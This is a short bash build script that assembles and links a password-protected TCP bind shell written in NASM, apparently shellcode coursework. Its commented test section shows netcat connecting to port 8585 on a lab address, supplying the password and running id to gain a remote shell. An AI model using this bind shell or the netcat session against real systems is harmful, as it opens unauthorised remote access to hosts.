#!/bin/bash

echo '[+] Assembling'
nasm -f elf shell_bind_tcp_passw.nasm  -o shell_bind_tcp_passw.o

echo '[+] Linking'
ld -z execstack -N shell_bind_tcp_passw.o -o shell_bind_tcp_passw

echo '[+] Cleaning'
rm -f *.o

echo '[+] Done!'

# Test:
# Server: 
#   ./shell_bind_tcp_passw 
# Client: 
#  nc -nvv 192.168.56.1 8585
#  (UNKNOWN) [192.168.56.1] 8585 (?) open
#  s3cr37
#  id
#  uid=1000(liv) gid=1000(liv) groups=1000(liv),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare),125(vboxusers)



